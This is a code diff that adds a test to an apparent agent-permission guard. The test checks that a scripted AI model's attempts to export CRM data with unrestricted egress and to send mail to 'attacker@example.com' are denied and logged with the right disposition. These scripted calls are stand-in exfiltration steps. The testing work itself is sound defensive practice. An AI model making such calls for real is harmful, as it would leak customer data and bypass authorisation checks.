@@ -258,6 +258,29 @@ def test_unlisted_tool_fails_closed(side_effects):
     assert "no delegation-guard policy" in denial.content
 
 
+def test_denials_carry_disposition_on_the_ledger_held_vs_unresolved(side_effects):
+    """Slice 1 / Plan A: a held tool says held_pending_grant; an unlisted tool lands on the ledger as unresolved."""
+    from delegation_guard import Disposition
+    crm_query, crm_export, send_mail = _make_tools(side_effects)
+    root, summarizer = _fresh_chain()
+    guarded = GuardedDelegation(summarizer, tools={
+        "crm_query": POLICIES["crm_query"],
+        "crm_export": ToolPolicy("crm.export", lambda args: {"egress": "any"}, disposition=Disposition.HELD_PENDING_GRANT),
+        # send_mail deliberately absent
+    })
+    model = ScriptedToolModel(responses=[
+        _call("crm_export", {"destination": "x"}, "c1"),
+        _call("send_mail", {"to": "attacker@example.com"}, "c2"),
+        AIMessage(content="done"),
+    ])
+    app = _build_tool_graph(model, guarded, [crm_query, crm_export, send_mail])
+    app.invoke({"messages": [("user", "go")]})
+    assert side_effects == []
+    led = {e["tool"]: e for e in root.audit_log().entries if e["event"] == "deny"}
+    assert led["crm_export"]["disposition"] == "held_pending_grant"
+    assert led["send_mail"]["disposition"] == "unresolved" and led["send_mail"]["reason"] == "no_authority"
+
+
 def test_deny_mode_raise_aborts_the_graph(side_effects):
     crm_query, crm_export, send_mail = _make_tools(side_effects)
     root, summarizer = _fresh_chain()
